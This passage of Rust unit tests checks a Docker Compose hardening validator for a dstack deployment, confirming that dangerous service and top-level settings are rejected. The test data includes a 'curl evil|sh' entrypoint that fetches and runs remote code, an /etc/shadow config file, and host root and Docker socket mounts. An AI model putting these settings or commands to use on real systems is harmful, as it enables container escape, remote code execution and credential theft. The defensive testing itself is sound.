        let tpl =
            std::fs::read_to_string(format!("{dir}deploy/dstack/docker-compose.template.yml"))
                .unwrap();
        assert_eq!(hard(&tpl), Vec::<String>::new());
    }

    /// Review PoC: everything here used to pass the config and image checks.
    #[test]
    fn dangerous_service_settings_rejected() {
        let y = format!(
            "services:\n  attest:\n    image: a/b@sha256:{D}\n    privileged: true\n    network_mode: host\n    pid: host\n    entrypoint: [\"/bin/sh\",\"-c\",\"curl evil|sh\"]\n    volumes:\n      - /:/host\n      - /var/run/dstack.sock:/var/run/dstack.sock\n      - /var/run/docker.sock:/var/run/docker.sock\n    env_file: /dstack/.host-shared/.decrypted-env\n"
        );
        let p = hard(&y);
        for needle in [
            "`privileged`",
            "`network_mode`",
            "`pid`",
            "`entrypoint`",
            "`/:/host`",
            "Docker socket",
            "`env_file`",
        ] {
            assert!(p.iter().any(|m| m.contains(needle)), "{needle}: {p:?}");
        }
        assert_eq!(p.len(), 7, "{p:?}");
    }

    #[test]
    fn hardening_rules_one_by_one() {
        let svc = |name: &str, extra: &str| {
            format!("services:\n  {name}:\n    image: a/b@sha256:{D}\n{extra}volumes:\n  data:\n")
        };
        let bad = |extra: &str| {
            let p = hard(&svc("vw", extra));
            assert_eq!(p.len(), 1, "{extra:?}: {p:?}");
        };
        let ok = |extra: &str| assert_eq!(hard(&svc("vw", extra)), Vec::<String>::new(), "{extra}");

        ok(
            "    user: \"0:0\"\n    cap_drop: [ALL]\n    read_only: true\n    security_opt: [\"no-new-privileges:true\"]\n",
        );
        ok("    volumes:\n      - data:/data\n      - data:/ro:ro\n    tmpfs:\n      - /run\n");
        ok(
            "    volumes:\n      - type: tmpfs\n        target: /run\n      - type: volume\n        source: data\n        target: /d\n",
        );
        for extra in [
            "    privileged: true\n",
            "    privileged: false\n",
            "    cap_add: [NET_ADMIN]\n",
            "    devices: [\"/dev/sda:/dev/sda\"]\n",
            "    network_mode: host\n",
            "    network_mode: \"service:proxy\"\n",
            "    pid: host\n",
            "    ipc: host\n",
            "    env_file: .env\n",
            "    security_opt: [\"seccomp:unconfined\"]\n",
            "    security_opt: [\"no-new-privileges:true\", \"apparmor=unconfined\"]\n",
            "    security_opt: [\"no-new-privileges:false\"]\n",
            "    command: [\"sh\"]\n",
            "    healthcheck:\n      test: [\"CMD\", \"true\"]\n",
            "    volumes_from: [proxy]\n",
            "    some_future_key: 1\n",
            "    volumes:\n      - /etc:/etc:ro\n",
            "    volumes:\n      - ./x:/x\n",
            "    volumes:\n      - undeclared:/x\n",
            "    volumes:\n      - /var/run/dstack.sock:/var/run/dstack.sock\n",
            "    volumes:\n      - data:/var/run/docker.sock\n",
            "    volumes:\n      - type: bind\n        source: /\n        target: /host\n",
        ] {
            bad(extra);
        }
        // The dstack socket: on `attest` only, and only that exact mapping.
        let sock = "    volumes:\n      - /var/run/dstack.sock:/var/run/dstack.sock\n";
        assert!(hard(&svc("attest", sock)).is_empty());
        assert_eq!(
            hard(&svc(
                "attest",
                "    volumes:\n      - /var/run:/var/run/dstack.sock\n"
            ))
            .len(),
            1
        );

        // Policy opt-ins are per service and exact.
        let binds = ["vw:./x:/x:ro".to_owned()];
        let cmds = ["vw".to_owned()];
        let h = Hardening {
            allowed_bind_mounts: &binds,
            command_override_services: &cmds,
        };
        let run =
            |name: &str, extra: &str| hardening_problems(&wrap(&svc(name, extra)), h).unwrap();
        assert!(
            run(
                "vw",
                "    command: [\"sh\"]\n    volumes:\n      - ./x:/x:ro\n"
            )
            .is_empty()
        );
        assert_eq!(run("vw", "    volumes:\n      - ./x:/x\n").len(), 1);
        assert_eq!(run("other", "    command: [\"sh\"]\n").len(), 1);
        assert_eq!(run("other", "    volumes:\n      - ./x:/x:ro\n").len(), 1);
    }

    #[test]
    fn hardening_top_level() {
        let base = format!("services:\n  vw:\n    image: a/b@sha256:{D}\n");
        let with = |extra: &str| hard(&format!("{base}{extra}"));
        assert!(with("volumes:\n  t:\n    driver: local\n    driver_opts:\n      type: tmpfs\n      device: tmpfs\n      o: \"size=8m,mode=0700,nosuid,nodev,noexec\"\n").is_empty());
        assert!(with("configs:\n  c:\n    content: |\n      x\nnetworks:\n  n:\n").is_empty());
        for extra in [
            "volumes:\n  t:\n    driver_opts:\n      type: none\n      device: /\n      o: bind\n",
            "volumes:\n  t:\n    driver_opts:\n      type: tmpfs\n      device: tmpfs\n      o: \"size=8m,exec\"\n",
            "volumes:\n  t:\n    external: true\n",
            "configs:\n  c:\n    file: /etc/shadow\n",
            "configs:\n  c:\n    environment: TOKEN\n",
            "networks:\n  n:\n    external: true\n",
            "secrets:\n  s:\n    file: /x\n",
            "x-anything: 1\n",
        ] {
            assert_eq!(with(extra).len(), 1, "{extra:?}");
        }
    }

    #[test]
    fn interpolated_image_rejected() {
        let imgs = vec![ImageDigest {
            service: "vw".into(),
            image: format!("${{IMG}}x@sha256:{D}"),
        }];
        assert!(matches!(
            check_images(&imgs, &[]).first(),
            Some(ImageProblem::NotPinned { .. })
        ));
    }
}
